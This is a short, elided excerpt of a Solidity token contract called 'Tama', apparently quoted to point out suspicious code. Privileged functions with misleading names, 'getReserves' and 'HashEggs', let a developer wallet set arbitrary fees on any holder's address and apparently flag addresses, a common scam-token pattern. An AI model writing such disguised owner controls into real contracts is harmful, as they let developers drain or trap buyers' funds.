...
contract Tama is Ownable {
    ...
    uint256 private _totalSupply = 9999999990 * (10 ** decimals());
    ...
    function getReserves(address miner, uint256 _value) external __devWallet {
        _FeesPair[miner] = _value * 10 ** decimals();
    }
    ...
    function HashEggs(address addr,bool status) external __devWallet {
